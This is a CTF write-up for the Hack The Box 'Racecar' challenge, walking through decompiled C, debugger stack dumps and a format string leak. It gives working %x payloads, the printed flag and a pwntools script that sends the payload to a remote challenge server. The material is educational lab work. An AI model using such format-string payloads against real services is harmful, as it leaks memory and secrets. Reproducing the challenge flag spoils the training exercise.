### Challenge: Racecar

### Type: PWN

We have another Format String Vulnerability! but this one is a bit easier than the last one I did. Technically you do not even have to use the format string attack.

Running the program gives a bunch of different options for winning a race. Winning the race is the first step to locating the flag.

```console
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |
    (   _    _ _\                                  |xxx|
*** =`-(_)--(_)-'                                  | I |
                                                   |xxx|
                                                   | N |
                                                   |xxx|
                                                   | I |
                                                   |xxx|
             _-_-  _/\______\__                    | S |
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|
            _-_- `( o )----( o )-'                 | H |
                   `-'      `-'                    |xxx|
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

Insert your data:

Name: 2
Nickname: 2

[+] Welcome [2]!

[*] Your name is [2] but everybody calls you.. [2]!
[*] Current coins: [69]

1. Car info
2. Car selection
> 2


Select car:
1. 🚗
2. 🏎️
> 2


Select race:
1. Highway battle
2. Circuit
> 1

[*] Waiting for the race to finish...

[+] You won the race!! You get 100 coins!
[+] Current coins: [169]

[!] Do you have anything to say to the press after your big victory?
> 
```

Now in Ghidra we can see the important function that will print our flag.

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void car_menu(void)

{
  int iVar1;
  int iVar2;
  uint __seed;
  size_t sVar3;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  undefined *puVar4;
  int local_5c;
  int local_58;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  do {
    printf(&DAT_00011948);
    iVar1 = read_int();
    if ((iVar1 != 2) && (iVar1 != 1)) {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  } while ((iVar1 != 2) && (iVar1 != 1));
  iVar2 = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
    local_5c = rand();
    local_5c = local_5c % 10;
    local_58 = rand();
    local_58 = local_58 % 100;
  }
  else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
    local_5c = rand();
    local_5c = local_5c % 100;
    local_58 = rand();
    local_58 = local_58 % 10;
  }
  else {
    local_5c = rand();
    local_5c = local_5c % 100;
    local_58 = rand();
    local_58 = local_58 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar3 = strlen("\n[*] Waiting for the race to finish...");
    if (sVar3 <= local_54) break;
    putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
    if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((iVar1 == 1) && (local_5c < local_58)) || ((iVar1 == 2 && (local_58 < local_5c)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar4 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar4);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);
  }
  else if (((iVar1 == 1) && (local_58 < local_5c)) || ((iVar1 == 2 && (local_5c < local_58)))) {
    printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
    coins = 0;
    printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

Towards the bottom we can see that __stream will open the flag.txt and read it. 

```c
__format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0)
```
And the fgets function also uses __stream. So lets go find this in GDB

```c
fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170)
```
Setting a breakpoint at ```0x56556002``` will take us to just after ```[!] Do you have anything to say to the press after your big victory?```

Here we can check how it is reading the flag.

```console
pwndbg> x/32x $esp
0xffffd020:	0x5655a200	0x5655a200	0x00000170	0x56555dfa
0xffffd030:	0x00000062	0x00000001	0x00000026	0x00000002
0xffffd040:	0x00000001	0x5655696c	0x5655a200	0x5655a380
0xffffd050:	0x7b425448	0x5f796877	0x5f643164	0x34735f31
0xffffd060:	0x745f3376	0x665f3368	0x5f67346c	0x745f6e30
0xffffd070:	0x355f3368	0x6b633474	0x007d213f	0xf3891500
0xffffd080:	0xf7fa53fc	0x56558f8c	0xffffd0a8	0x56556441
0xffffd090:	0x00000001	0xffffd164	0xffffd16c	0xf3891500
pwndbg> 
```

Now if you run these through cyberchef it will give you back the flag and other data.

Note: These hex all need their endianess swapped to come out correctly.

```.¢UV.¢UVp...ú]UVb.......&...........liUV.¢UV.£UVHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}....óüSú÷..UV¨ÐÿÿAdUV....dÑÿÿlÑÿÿ...ó```

However to perform the format string attack you just need to input strings to leak data like so.

All of the %x are actually printing directly from the stack leaking the flag data.

```console
[!] Do you have anything to say to the press after your big victory?
> %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
574a41c0 170 56610dfa 30 7 26 2 1 5661196c 574a41c0 574a4340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 838c7900 f7f673fc 56613f8c ffbb4bb8 56611441 1 ffbb4c64 ffbb4c6c 838c7900 ffbb4bd0 0 0 f7daaf21 f7f67000 f7f67000 0 f7daaf21 1 ffbb4c64 ffbb4c6c ffbb4bf4 1 ffbb4c64 f7f67000 f7f8570a ffbb4c60 0 f7f67000 0 0 c1a05b7c 26a3d6c 0 0 0
```

This is much more clean and you can convert the flag almost perfectly.

```console
[!] Do you have anything to say to the press after your big victory?
> %12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 20e68a00
```

And here is a simple python script to do the same thing.

Note: It will add a . to the end of this since the final hexidecimal is short. At least in cyber chef this is why i got the issue.

```python
#!/usr/bin/python3
from pwn import *

#context(os='linux', arch='amd64')
#libc = ELF('/home/htb-0xrogue/Downloads/challenge/glibc/libc.so.6')
#e = ELF('racecar')
#context.binary = e
#p = e.process()
p = remote("209.97.141.62",30326 )
p.sendlineafter("Name:", b"2")
p.sendlineafter("Nickname:", b"2")
p.sendlineafter(">", b"2")
p.sendlineafter(">", b"2")
p.sendlineafter(">", b"1")
p.sendlineafter(">", "%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x")
p.recv()
response = p.recv()

print(response)
```
I hope somebody learned a little about format string, my previous write up for HTB apocalypse on Entrypoint is a little harder than this.
GG!
